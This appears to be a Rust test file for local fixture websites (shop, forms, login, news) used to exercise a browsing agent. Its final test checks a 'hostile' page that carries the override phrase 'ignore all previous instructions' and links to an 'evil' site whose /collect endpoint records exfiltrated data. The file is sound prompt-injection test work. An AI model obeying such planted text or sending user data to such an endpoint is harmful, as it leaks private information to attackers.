//! Fixture sites are exercised over plain HTTP/1.1 on loopback (no browser).

use fixtures::Fixture;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

struct Resp {
    status: u16,
    headers: String,
    body: String,
}

async fn request(fx: &Fixture, method: &str, host: &str, path: &str, cookie: Option<&str>, form: Option<&str>) -> Resp {
    let mut s = tokio::net::TcpStream::connect(fx.addr).await.unwrap();
    let mut req =
        format!("{method} {path} HTTP/1.1\r\nHost: {host}.localhost:{}\r\nConnection: close\r\n", fx.addr.port());
    if let Some(c) = cookie {
        req.push_str(&format!("Cookie: {c}\r\n"));
    }
    match form {
        Some(f) => req.push_str(&format!(
            "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{f}",
            f.len()
        )),
        None => req.push_str("\r\n"),
    }
    s.write_all(req.as_bytes()).await.unwrap();
    let mut buf = Vec::new();
    s.read_to_end(&mut buf).await.unwrap();
    let text = String::from_utf8_lossy(&buf).to_string();
    let (head, body) = text.split_once("\r\n\r\n").unwrap_or((&text, ""));
    let status = head.split_whitespace().nth(1).and_then(|s| s.parse().ok()).unwrap_or(0);
    Resp { status, headers: head.to_string(), body: body.to_string() }
}

#[tokio::test]
async fn virtual_hosts_are_distinct_sites() {
    let fx = Fixture::spawn().await;
    let shop = request(&fx, "GET", "shop", "/", None, None).await;
    assert_eq!(shop.status, 200);
    assert!(shop.body.contains("Aero X1 Headphones"));
    let shop2 = request(&fx, "GET", "shop2", "/", None, None).await;
    assert!(shop2.body.contains("Aero X1"), "variant B carries the same products under other prices");
    assert_ne!(shop.body, shop2.body);
    let news = request(&fx, "GET", "news", "/table", None, None).await;
    assert!(news.body.contains(r#"id="cities""#));
    let missing = request(&fx, "GET", "shop", "/nope", None, None).await;
    assert_eq!(missing.status, 404);
}

#[tokio::test]
async fn shop_search_cart_and_checkout_record_orders() {
    let fx = Fixture::spawn().await;
    let r = request(&fx, "GET", "shop", "/search?q=light", None, None).await;
    assert!(r.body.contains("Orbit Ring Light") && !r.body.contains("Aero X1"));

    let r = request(&fx, "POST", "shop", "/cart/add/8", None, Some("add=")).await;
    assert_eq!(r.status, 200);
    let cookie = r
        .headers
        .lines()
        .find_map(|l| l.strip_prefix("set-cookie: ").or_else(|| l.strip_prefix("Set-Cookie: ")))
        .map(|c| c.split(';').next().unwrap().to_string())
        .expect("cart cookie");
    let r = request(&fx, "GET", "shop", "/cart", Some(&cookie), None).await;
    assert!(r.body.contains("Orbit Ring Light"));

    assert!(fx.orders().is_empty());
    let r = request(
        &fx,
        "POST",
        "shop",
        "/checkout",
        Some(&cookie),
        Some("name=Ada&email=ada%40example.org&card=4111111111111111&cvc=123"),
    )
    .await;
    assert_eq!(r.status, 200, "{}", r.body);
    assert_eq!(fx.orders().len(), 1);
}

#[tokio::test]
async fn forms_echo_and_record_submissions() {
    let fx = Fixture::spawn().await;
    let r = request(
        &fx,
        "POST",
        "forms",
        "/contact",
        None,
        Some("name=Ada+Lovelace&email=ada%40example.org&topic=support&message=Hi&newsletter=yes"),
    )
    .await;
    assert_eq!(r.status, 200);
    assert!(r.body.contains(r#"id="echo-name""#) && r.body.contains("Ada Lovelace"));
    let c = fx.contacts();
    assert_eq!(c.len(), 1);
    assert_eq!(c[0].get("topic").map(String::as_str), Some("support"));
}

#[tokio::test]
async fn login_sets_httponly_session_and_gates_account() {
    let fx = Fixture::spawn().await;
    let r = request(&fx, "GET", "login", "/account", None, None).await;
    assert!((300..400).contains(&r.status), "anonymous access must redirect: {}", r.status);

    let r = request(&fx, "POST", "login", "/login", None, Some("user=demo&pass=wrong")).await;
    assert_eq!(r.status, 401);

    let r = request(&fx, "POST", "login", "/login", None, Some("user=demo&pass=demo")).await;
    assert_eq!(r.status, 200);
    let set_cookie = r.headers.lines().find(|l| l.to_ascii_lowercase().starts_with("set-cookie:")).unwrap();
    assert!(set_cookie.contains("sid=demo-session-token") && set_cookie.contains("HttpOnly"));

    let r = request(&fx, "GET", "login", "/account", Some("sid=demo-session-token"), None).await;
    assert_eq!(r.status, 200);
    assert!(r.body.contains("Pro (annual)"));
}

#[tokio::test]
async fn hostile_page_links_to_evil_and_evil_records_hits() {
    let fx = Fixture::spawn().await;
    let r = request(&fx, "GET", "hostile", "/", None, None).await;
    assert!(r.body.contains(&fx.origin("evil")));
    assert!(r.body.contains("ignore all previous instructions"));
    assert!(fx.collected().is_empty());

    let r = request(&fx, "GET", "evil", "/collect?d=hello%20there", None, None).await;
    assert_eq!(r.status, 200);
    assert_eq!(fx.collected(), vec!["hello there".to_string()]);
    let r = request(&fx, "GET", "evil", "/collected", None, None).await;
    assert!(r.body.contains("hello there"));
    fx.abort();
}
